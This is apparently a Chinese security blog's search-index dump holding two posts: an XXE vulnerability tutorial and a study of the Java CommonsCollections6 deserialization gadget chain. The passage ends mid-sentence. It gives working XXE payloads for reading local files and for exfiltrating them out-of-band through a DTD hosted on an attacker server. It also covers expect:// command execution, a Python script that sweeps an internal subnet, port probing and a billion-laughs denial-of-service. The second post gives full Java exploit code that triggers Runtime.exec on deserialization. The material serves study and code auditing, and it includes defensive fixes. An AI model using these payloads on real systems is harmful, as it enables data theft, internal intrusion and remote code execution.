\u003cuser\u003e \u003cname\u003eMi1k7ea\u003c/name\u003e \u003csex\u003emale\u003c/sex\u003e \u003cage\u003e\u0026tea;\u003c/age\u003e \u003c/user\u003e 需要在攻击者的服务器的Web目录放置一个1.dtd文件，内容如下，读取本地C盘中的win.ini配置文件（若在Linux下读取”file:///etc/passwd”会报错，因为这种攻击方式受到XML中禁止字符的限制）： \u003c!ENTITY tea SYSTEM \"file:///c:/windows/win.ini\"\u003e 运行代码，在攻击者服务器看到目标程序访问了其中的恶意DTD文件： 发现成功通过远程加载解析DTD文件读取了本地文件内容： 外部实体还有另一种写法，如下： \u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \u003c!DOCTYPE foo [ \u003c!ENTITY % milk SYSTEM \"http://192.168.17.136:8000/Mi1k7ea.dtd\"\u003e %milk; ]\u003e \u003cuser\u003e \u003cname\u003eMi1k7ea\u003c/name\u003e \u003csex\u003emale\u003c/sex\u003e \u003cage\u003e\u0026tea;\u003c/age\u003e \u003c/user\u003e ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:1","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"有回显读取本地文件(Norm XXE) Payload: \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE test [\u003c!ENTITY xxe SYSTEM \"file:///tmp/flag.txt\"\u003e]\u003e \u003cperson\u003e\u003cname\u003e\u0026xxe;\u003c/name\u003e\u003c/person\u003e ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:2","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"使用 netdoc 的 XXE 攻击 主要将file://换成netdoc:/ \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE data [ \u003c!ELEMENT data (#PCDATA)\u003e \u003c!ENTITY file SYSTEM \"netdoc:/e:/passwd\"\u003e ]\u003e \u003cuser\u003e \u003cname\u003enetdoc\u003c/name\u003e \u003csex\u003enetdoc\u003c/sex\u003e \u003cage\u003e\u0026file;\u003c/age\u003e \u003c/user\u003e 一些基本的绕过：https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#%E7%BB%95%E8%BF%87%E5%9F%BA%E6%9C%AC-XXE-%E6%94%BB%E5%87%BB%E7%9A%84%E9%99%90%E5%88%B6 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:3","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"OOB XXE 但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带 想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求) Java在Blind XXE的利用上，读取文件会有些问题，在PHP中，我们可以使用 php://filter/read=convert.base64-encode/resource=/etc/hosts 方法将文本内容进行base64编码。但是Java中没这样的编码方法，所以如果要读取换行的文件，一般使用FTP协议，HTTP协议会由于存在换行等字符，请求发送失败。 1.在我们VPS创建一个test.dtd文件： \u003c!ENTITY % file SYSTEM \"file:///tmp/flag.txt\"\u003e \u003c!ENTITY % int \"\u003c!ENTITY \u0026#37; send SYSTEM 'http://192.168.3.214:7777?p=%file;'\u003e\"\u003e 2.开始web服务，以便后续步骤可以访问到这个test.dtd文件，比如SimpleHTTPServer 3.burp抓包修改数据包, 下面数据包一旦经受害者服务器处理，就会向我们的vps发送请求，查找我们的DTD文件 \u003c!DOCTYPE convert [ \u003c!ENTITY % remote SYSTEM \"http://192.168.3.214:7777/test.dtd\"\u003e %remote;%int;%send; ]\u003e 结果我们vps收到了flag.txt的文件内容，而SimpleHTTPServer也收到了对test.dtd的GET请求 整个调用过程： 我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 %)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。 思考： 我们刚刚都只是做了一件事，那就是通过 file 协议读取本地文件，或者是通过 http 协议发出请求，熟悉 SSRF 的童鞋应该很快反应过来，这其实非常类似于 SSRF ，因为他们都能从服务器向另一台服务器发起请求，那么我们如果将远程服务器的地址换成某个内网的地址，（比如 192.168.0.10:8080）是不是也能实现 SSRF 同样的效果呢？没错，XXE 其实也是一种 SSRF 的攻击手法，因为 SSRF 其实只是一种攻击模式，利用这种攻击模式我们能使用很多的协议以及漏洞进行攻击。 所以要想更进一步的利用我们不能将眼光局限于 file 协议，我们必须清楚地知道在何种平台，我们能用何种协议: ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:4","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"请求DNSLog \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE root [ \u003c!ENTITY file SYSTEM \"https://dnslog地址\"\u003e ]\u003e \u003croot\u003e\u0026file;\u003c/root\u003e ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:5","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"执行系统命令 我们说的利用xxe命令执行，直接获取shell，都是在php中的xxe，PHP expect模块被加载到了易受攻击的系统或处理XML的内部应用程序上，我们可以直接执行系统命令；这种情况少有发生，而且换到了java中，并没有直接能shell的操作 \u003c?xml version=\"1.0\"?\u003e \u003c!DOCTYPE ANY [ \u003c! ENTITY xxe SYSTEM \"expect://id\"\u003e ]\u003e \u003cx\u003e\u0026xxe\u003c/x\u003e ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:6","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"探测内网 可通过时间响应差异等情况探测内网IP，以及端口开放情况。 如果内网存在redis未授权，可以尝试进行组合攻击。 \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE ANY[ \u003c!ENTITY port SYSTEM \"http://127.0.0.1:80\"\u003e ]\u003e \u003cx\u003e\u0026port;\u003c/x\u003e HTTP内网主机探测： 以存在 XXE 漏洞的服务器为我们探测内网的支点。要进行内网探测我们还需要做一些准备工作，我们需要先利用 file 协议读取我们作为支点服务器的网络配置文件，看一下有没有内网，以及网段大概是什么样子（以linux 为例），可以尝试读取 /etc/network/interfaces 或者 /proc/net/arp 或者 /etc/host 文件以后我们就有了大致的探测方向了 脚本例子如下： import requests import base64 #Origtional XML that the server accepts #\u003cxml\u003e # \u003cstuff\u003euser\u003c/stuff\u003e #\u003c/xml\u003e def build_xml(string): xml = \"\"\"\u003c?xml version=\"1.0\" encoding=\"ISO-8859-1\"?\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003c!DOCTYPE foo [ \u003c!ELEMENT foo ANY \u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003c!ENTITY xxe SYSTEM \"\"\" + '\"' + string + '\"' + \"\"\"\u003e]\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003cxml\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\" \u003cstuff\u003e\u0026xxe;\u003c/stuff\u003e\"\"\" xml = xml + \"\\r\\n\" + \"\"\"\u003c/xml\u003e\"\"\" send_xml(xml) def send_xml(xml): headers = {'Content-Type': 'application/xml'} x = requests.post('http://34.200.157.128/CUSTOM/NEW_XEE.php', data=xml, headers=headers, timeout=5).text coded_string = x.split(' ')[-2] # a little split to get only the base64 encoded value print coded_string # print base64.b64decode(coded_string) for i in range(1, 255): try: i = str(i) ip = '10.0.0.' + i string = 'php://filter/convert.base64-encode/resource=http://' + ip + '/' print string build_xml(string) except: continue HTTP 内网主机端口扫描： 找到了内网的一台主机，想要知道攻击点在哪，我们还需要进行端口扫描，端口扫描的脚本主机探测几乎没有什么变化，只要把ip 地址固定，然后循环遍历端口就行了，当然一般我们端口是通过响应的时间的长短判断该该端口是否开放的。 比如传入： \u003c?xml version=\"1.0\" encoding=\"utf-8\"?\u003e \u003c!DOCTYPE data SYSTEM \"http://127.0.0.1:515/\" [ \u003c!ELEMENT data (#PCDATA)\u003e ]\u003e \u003cdata\u003e4\u003c/data\u003e 然后用burp进行端口遍历： 至此，我们已经有能力对整个网段进行了一个全面的探测,并能得到内网服务器的一些信息了，如果内网的服务器有漏洞，并且恰好利用方式在服务器支持的协议的范围内的话，我们就能直接利用 XXE 打击内网服务器甚至能直接 getshell（比如有些 内网的未授权 redis 或者有些通过 http get 请求就能直接getshell 的 比如 strus2） ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:7","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"文件上传 利用Java的jar协议配合file协议 jar:// 协议的格式： jar:{url}!{path} 实例： jar:http://host/application.jar!/file/within/the/zip 这个 ! 后面就是其需要从中解压出的文件 jar 能从远程获取 jar 文件，然后将其中的内容进行解压，等等。 jar 协议处理文件的过程： (1) 下载 jar/zip 文件到临时文件中 (2) 提取出我们指定的文件 (3) 删除临时文件 那么我们怎么找到我们下载的临时文件呢？ 因为在 java 中 file:/// 协议可以起到列目录的作用，所以我们能用 file:/// 协议配合 jar:// 协议使用 可以参考这位师傅的文章：https://xz.aliyun.com/t/3357 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:8","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"DoS 攻击 其原理是通过不断迭代增大变量的空间，进而导致内存崩溃。 \u003c!--?xml version=\"1.0\" ?--\u003e \u003c!DOCTYPE lolz [\u003c!ENTITY lol \"lol\"\u003e\u003c!ELEMENT lolz (#PCDATA)\u003e \u003c!ENTITY lol1 \"\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol; \u003c!ENTITY lol2 \"\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\"\u003e \u003c!ENTITY lol3 \"\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\"\u003e \u003c!ENTITY lol4 \"\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\"\u003e \u003c!ENTITY lol5 \"\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\"\u003e \u003c!ENTITY lol6 \"\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\"\u003e \u003c!ENTITY lol7 \"\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\"\u003e \u003c!ENTITY lol8 \"\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\"\u003e \u003c!ENTITY lol9 \"\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\"\u003e \u003ctag\u003e\u0026lol9;\u003c/tag\u003e ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:9","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"其他payload 更多payload可参考：https://github.com/payloadbox/xxe-injection-payload-list ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:3:10","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"代码审计 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:4:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"XML的常见接口 解析XML常见的方法有四种，即：DOM、DOM4J、JDOM 和SAX。 Java中常用以下常见接口来解析XML语言： 1.XMLReader 当XMLReader使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞 @PostMapping(\"/xmlReader/vuln\") public String xmlReaderVuln(HttpServletRequest request) { try { String body = WebUtils.getRequestBody(request); logger.info(body); XMLReader xmlReader = XMLReaderFactory.createXMLReader(); xmlReader.parse(new InputSource(new StringReader(body))); // parse xml return \"xmlReader xxe vuln code\"; } catch (Exception e) { logger.error(e.toString()); return EXCEPT; } } 2.SAXBuilder SAXBuilder是一个JDOM解析器 能将路径中的XML文件解析为Document对象 当SAXBuilder使用默认的解析方法且未对xml进行过滤时，会出现xxe漏洞 需要引入依赖： \u003cdependency\u003e \u003cgroupId\u003eorg.jdom\u003c/groupId\u003e \u003cartifactId\u003ejdom\u003c/artifactId\u003e \u003cversion\u003e1.1.3\u003c/version\u003e \u003c/dependency\u003e package com.example.xxedemo; import org.jdom.input.SAXBuilder; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.xml.sax.InputSource; import javax.servlet.http.HttpServletRequest; import java.io.IOException; import java.io.InputStream; import java.io.StringReader; /** * 编号7089 */ @RestController public class JDOMTest { @RequestMapping(\"/jdomdemo/vul\") public String jdomDemo(HttpServletRequest request) throws IOException { //获取输入流 InputStream in = request.getInputStream(); String body = convertStreamToString(in); try { SAXBuilder builder = new SAXBuilder(); // builder.build(new InputSource(new StringReader(body))); return \"jdom xxe vuln code\"; } catch (Exception e) { return \"Error......\"; } } public static String convertStreamToString(java.io.InputStream is) { java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; } } 3.SAXReader SAXReader是第三方的库，该类是无回显的 引入依赖： \u003cdependency\u003e \u003cgroupId\u003edom4j\u003c/groupId\u003e \u003cartifactId\u003edom4j\u003c/artifactId\u003e \u003cversion\u003e1.6.1\u003c/version\u003e \u003c/dependency\u003e package com.example.xxedemo; import org.dom4j.io.SAXReader; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.xml.sax.InputSource; import javax.servlet.http.HttpServletRequest; import java.io.InputStream; import java.io.StringReader; /** * 编号7089 */ @RestController public class DOM4JTest { @RequestMapping(\"/dom4jdemo/vul\") public String dom4jDemo(HttpServletRequest request) { try { //获取输入流 InputStream in = request.getInputStream(); String body = convertStreamToString(in); SAXReader reader = new SAXReader(); //创建对象 reader.read(new InputSource(new StringReader(body))); //读取，解析 return \"DOM4J XXE......\"; } catch (Exception e) { return \"EXCEPT ERROR!!!\"; } } public static String convertStreamToString(java.io.InputStream is) { java.util.Scanner s = new java.util.Scanner(is).useDelimiter(\"\\\\A\"); return s.hasNext() ? s.next() : \"\"; } } Poc: ?xml version=\"1.0\" encoding=\"UTF-8\" ?\u003e \u003c!DOCTYPE data [ \u003c!ENTITY % remote SYSTEM \"http://127.0.0.1:8080/xxe.dtd\"\u003e %remote; ]\u003e \u003cmessage\u003e \u003cto\u003eKobe\u003c/to\u003e \u003cfrom\u003eJames\u003c/from\u003e \u003ctext\u003e\u0026tmp;\u003c/text\u003e \u003c/message\u003e 4.SAXParserFactory 该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台 package com.example.xxedemo; import com.sun.org.apache.xml.internal.resolver.readers.SAXParserHandler; import org.springframework.web.bind.annotation.RequestMapping; import org.springframework.web.bind.annotation.RestController; import org.xml.sax.InputSource; import javax.servlet.http.HttpServletRequest; import javax.xml.parsers.SAXParser; import javax.xml.parsers.SAXParserFactory; import java.io.IOException; import java.io.InputStream; import java.io.StringReader; /** * 编号7089 */ @RestController public class SAXTest { @RequestMapping(\"/saxdemo/vul\") public String saxDemo(HttpServletRequest request) throws IOException { //获取输入流 InputStream in = request.getInputStream(); String body = convertStreamToString(in); try { SAXParserFactory spf = SAXParserFactory.newInstance(); SAXParser parser = spf.newSAXParser(); SAXParserHandler handler = new SAXParserHandler(); //关键字 //解析xml parser.parse(new InputSource(new StringReader(body)), handler); return \"Sax xxe","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:4:1","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"挖掘技巧 挖掘XXE漏洞的关键是找到： 代码是否涉及xml解析(找这些关键字)——\u003exml输入是否是外部可控——\u003e是否禁用外部实体（DTD） 若三个条件满足则存在漏洞。 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:4:2","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"审计关键字 可以只搜索包的点的最后一部分，或者pom.xml中看到引入的第三方库 比较简单，看到解析XML的代码，并且没有setFeature禁用外部实体，那大可能就会有该漏 和其他漏洞一样，只不过审计时候搜索的关键字不同，搜索常见关键字以快速对代码进行定位： DocumentHelper DocumentHelper.parseText java.beans.XMLDecoder javax.xml.bind.Unmarshaller //使用默认的解析方法不会存在XXE问题，这也是唯一一个使用默认的解析方法不会存在XXE的一个库。 Unmarshaller javax.xml.parsers.DocumentBuilder // DoM解析 javax.xml.parsers.DocumentBuilderFactory DocumentBuilder DocumentBuilderFactory javax.xml.parsers.SAXParser //SAX解析 javax.xml.stream.XMLInputFactory javax.xml.stream.XMLStreamReader XMLStreamReader javax.xml.transform.sax.SAXSource javax.xml.transform.sax.SAXSource javax.xml.transform.sax.SAXTransformerFactory //SAXTransformerFactory SAXTransformerFactory javax.xml.transform.TransformerFactory TransformerFactory javax.xml.validation.SchemaFactory //SchemaFactory SchemaFactory javax.xml.validation.Validator javax.xml.xpath.XPathExpression XPathExpression newSAXParser oracle.xml.parser.v2.XMLParser org.apache.commons.digester.Digester //Digester解析 org.apache.commons.digester3.Digester Digester org.dom4j.DocumentHelper org.dom4j.io.SAXReader //dom4j解析 SAXReader org.jdom.input.SAXBuilder //JDOM解析 org.jdom.output.XMLOutputter org.jdom2.input.SAXBuilder SAXBuilder org.xml.sax.helpers.XMLReaderFactory XMLReaderFactory org.xml.sax.XMLReader XMLReader createXMLReader org.xml.sax.SAXParseExceptionpublicId SAXParserFactory //SAXParserFactory SAXSource ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:4:3","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"例子 这里以Hello-Java-Sec为简单例子说明 搜索关键字发现使用了DocumentBuilderFactory.newInstance() 进入代码查看xml是否可控 可以发现：程序首先通过DocumentBuilderFactory.newInstance()来获取一个实例，然后通过DocumentBuilder::parse来解析 继续跟进，发现直接通过getValueByTagName函数获取了person节点的内容并在进行对比数据后将其输出到页面上。也就是说可以通过控制person的值来达到回显xxe的目的。 构造payload： \u003c?xml version = \"1.0\"?\u003e \u003c!DOCTYPE ANY [ \u003c!ENTITY f SYSTEM \"file:///d://index.txt\"\u003e ]\u003e \u003cperson\u003e\u003cname\u003e\u0026f;\u003c/name\u003e\u003cpassword\u003eadmin888\u003c/password\u003e\u003c/person\u003e 成功读取文件 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:4:4","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"漏洞防御 使用XML解析器时需要设置其属性，禁止使用外部实体 禁用外部实体之后能解决绝大部分的安全问题 //实例化解析类之后常用的禁用外部实体的方法 obj.setFeature(\"http://apache.org/xml/features/disallow-doctype-decl\",true); obj.setFeature(\"http://xml.org/sax/features/external-general-entities\",false); obj.setFeature(\"http://xml.org/sax/features/external-parameter-entities\",false); // 注意，不同解析库的修复方案不同 但是不同库的禁止方法略微有不同，具体可以参考这篇文章：Java中不同库的修复方法 手动黑名单过滤 许多第三方组件会爆出xxe漏洞，应避免引入这些组件 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:5:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["渗透测试"],"content":"参考文章 https://mp.weixin.qq.com/s?__biz=MzI3MTQyNzQxMA==\u0026mid=2247484073\u0026idx=1\u0026sn=483c6a12a0813dc3d608782f455a14e3\u0026chksm=eac0b094ddb7398279a61a6ce506e45a2d89f8db19b5f5a64023ad915c9ffebe405171334919\u0026scene=21#wechat_redirect https://yoga7xm.top/2020/02/17/javaxxe/ https://www.mi1k7ea.com/2019/02/13/XML%E6%B3%A8%E5%85%A5%E4%B9%8BDocumentBuilder/#0x03-XML%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E9%AA%8C%E8%AF%81 https://xz.aliyun.com/t/3357 ","date":"2024-07-05","objectID":"/xxe%E6%BC%8F%E6%B4%9E/:6:0","tags":["XXS","java安全","代码审计","渗透测试"],"title":"XXE漏洞","uri":"/xxe%E6%BC%8F%E6%B4%9E/"},{"categories":["Java安全"],"content":"前言 CC1 链的时候要求是比较严格的。要求的环境为 jdk8u65 与 Commons-Collections 3.2.1,而我们的 CC6 链，可以不受 jdk 版本制约。 CC6 链被称为\"最好用的 CC 链\"，是因为其不受 jdk 版本的影响，无论是 jdk8u65，或者 jdk9u312 都可以复现。 如果用一句话介绍一下 CC6，那就是 CC6 = CC1 + URLDNS CC6 链的前半条链与 CC1 正版链子是一样的，也就是到 LazyMap 链 ","date":"2023-11-26","objectID":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:1:0","tags":["cc链","java安全","反序列化"],"title":"CommonsCollections6利用链学习","uri":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"分析 简单来说，解决Java⾼版本利⽤问题，实际上就是在找上下⽂中是否还有其他调⽤ LazyMap#get() 的地⽅。 ","date":"2023-11-26","objectID":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:2:0","tags":["cc链","java安全","反序列化"],"title":"CommonsCollections6利用链学习","uri":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"p牛的 我们找到的类是 org.apache.commons.collections.keyvalue.TiedMapEntry 中调⽤了 this.map.get ，⽽其hashCode⽅法调⽤了getValue⽅法。 所以，欲触发LazyMap利⽤链，要找到就是哪⾥调⽤了TiedMapEntry#hashCode ysoserial中，是利⽤ java.util.HashSet#readObject 到HashMap#put()到HashMap#hash(key)最后到 TiedMapEntry#hashCode() 。 实际上在java.util.HashMap#readObject中就可以找到HashMap#hash()的调⽤，去掉了最前⾯的两次调⽤ 在HashMap的readObject⽅法中，调⽤到了 hash(key) ，⽽hash⽅法中，调⽤到了 key.hashCode() 。所以，我们只需要让这个key等于TiedMapEntry对象，即可连接上前⾯的分析过程，构成⼀个完整的Gadget。 构造Gadget： package org.example2; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import java.io.ByteArrayInputStream; import java.io.ByteArrayOutputStream; import java.io.ObjectInputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class CCC6 { public static void main(String[] args) throws Exception { byte[] evilData = serialize(cc6(\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\")); unserialize(evilData); } static Object cc6(String args) throws Exception { Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\" , new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\" , new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\" , new Class[]{String.class}, new Object[]{args}) }; //传给这里 ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); Map innerMap = new HashMap(); // 首先构造恶意的LazyMap Map outerMap = LazyMap.decorate(innerMap, chainedTransformer); // 现在，我拿到了⼀个恶意的LazyMap对象outerMap，将其作为TiedMapEntry的map属性： TiedMapEntry tme = new TiedMapEntry(outerMap, \"keykey\"); // 接着，为了调⽤TiedMapEntry#hashCode()，我们需要将 tme 对象作为HashMap 的⼀个key。注意，这⾥我们需要新建⼀个HashMap // 不再使⽤原CommonsCollections6中的HashSet，直接使⽤HashMap Map expMap = new HashMap(); expMap.put(tme,\"valval\"); outerMap.remove(\"keykey\"); //填坑操作 // 最后，我就可以将这个expMap作为对象来序列化了 // 将真正的transformers数组设置进来 Field f = ChainedTransformer.class.getDeclaredField(\"iTransformers\"); f.setAccessible(true); f.set(chainedTransformer, transformers); return expMap; } public static byte[] serialize(final Object obj) throws Exception { ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream objOut = new ObjectOutputStream(bout); objOut.writeObject(obj); return bout.toByteArray(); } public static Object unserialize(final byte[] seria) throws Exception{ ByteArrayInputStream btin = new ByteArrayInputStream(seria); ObjectInputStream ois = new ObjectInputStream(btin); return ois.readObject(); } } ","date":"2023-11-26","objectID":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/:2:1","tags":["cc链","java安全","反序列化"],"title":"CommonsCollections6利用链学习","uri":"/commonscollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%AD%A6%E4%B9%A0/"},{"categories":["Java安全"],"content":"ysoserial版 xxx.readObject() HashMap.put() HashMap.hash() TiedMapEntry.hashCode() TiedMapEntry.getValue() LazyMap.get() //---------从这里开始----------- ChainedTransformer.transform() InvokerTransformer.transform() Runtime.exec() 因为前半段链子，LazyMap 类到 InvokerTransformer 类是一样的，我们直接到 LazyMap 下。 我们还是找其他调用 get() 方法的地方(我也不知道这是怎么找出来的，因为 get() 方法如果find usages 会有很多很多方法) 1.寻找尾部的 exec 方法 尾部的链子还是 CC1 链中，我们用到的那个 InvokerTransformer 的方法，前一段链子是和 CC1 链是一样的。 2.找链子 根据 ysoSerial 官方的链子，是 TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。 这里先重新写一遍 LazyMap 类调用计算器的 EXP，这种 EXP多写一写能让自己更加熟练。 Runtime runtime = Runtime.getRuntime(); InvokerTransformer invokerTransformer = new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e hashMap = new HashMap\u003c\u003e(); Map decorateMap = LazyMap.decorate(hashMap, invokerTransformer); Class\u003cLazyMap\u003e lazyMapClass = LazyMap.class; Method lazyGetMethod = lazyMapClass.getDeclaredMethod(\"get\", Object.class); lazyGetMethod.setAccessible(true); lazyGetMethod.invoke(decorateMap, runtime); 链子的下一步是，TiedMapEntry 类中的 getValue() 方法调用了 LazyMap 的 get() 方法。我们用 TiedMapEntry 写一个 EXP，确保这条链子是能用的。 Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\", new Class[]{String.class, Class[].class}, new Object[]{\"getRuntime\", null}), new InvokerTransformer(\"invoke\", new Class[]{Object.class, Object[].class}, new Object[]{null, null}), new InvokerTransformer(\"exec\", new Class[]{String.class}, new Object[]{\"calc\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e hashMap = new HashMap\u003c\u003e(); Map lazyMap = LazyMap.decorate(hashMap, chainedTransformer); // TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap, \"keykey\"); tiedMapEntry.getKey(); 然后往上去找谁调用了 TiedMapEntry 中的 getValue() 方法。 因为 getValue() 这一个方法是相当相当常见的，所以我们一般会优先找同一类下是否存在调用情况。 寻找到同名函数下的 hashCode() 方法调用了 getValue() 方法。 如果我们在实战里面，在链子中找到了 hashCode() 方法，说明我们的构造已经可以**“半场开香槟”**了， 3. 与入口类结合的整条链子 前文我们说到链子已经构造到 